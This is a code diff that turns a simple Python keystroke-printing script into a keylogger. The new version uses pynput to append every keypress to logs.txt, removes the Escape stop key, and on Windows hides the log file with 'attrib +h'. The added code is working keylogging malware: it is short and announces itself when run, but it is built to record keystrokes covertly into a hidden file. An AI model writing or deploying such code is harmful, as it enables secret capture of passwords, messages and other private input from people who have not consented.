@@ -1,23 +1,23 @@
-from pynput.keyboard import Listener, Key        
-from datetime import datetime                 
+import pynput.keyboard
+import threading
+import os
 
-def timestamp():                           
-    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+log_file = "logs.txt"
 
-def on_press(key):                            
-    time = timestamp()                           
-    try:
-        print(f"{time} [PRESS] {key.char}")     
-    except AttributeError:
-        print(f"{time} [PRESS] {key}")       
+def write_to_file(key):
+    key = str(key).replace("'", "")
+    with open(log_file, "a") as f:
+        f.write(key + " ")
 
-def on_release(key):                    
-    time = timestamp()
-    print(f"{time} [RELEASE] {key}")
+def on_press(key):
+    write_to_file(key)
 
-    if key == Key.esc:
-        return False
 
-with Listener(on_press=on_press,
-              on_release=on_release) as listener:
-    listener.join()
+listener = pynput.keyboard.Listener(on_press=on_press)
+listener.start()
+
+if os.name == "nt":
+    os.system(f"attrib +h {log_file}")
+
+print("Keylogger running... (Press Ctrl+C to stop manually)")
+listener.join()
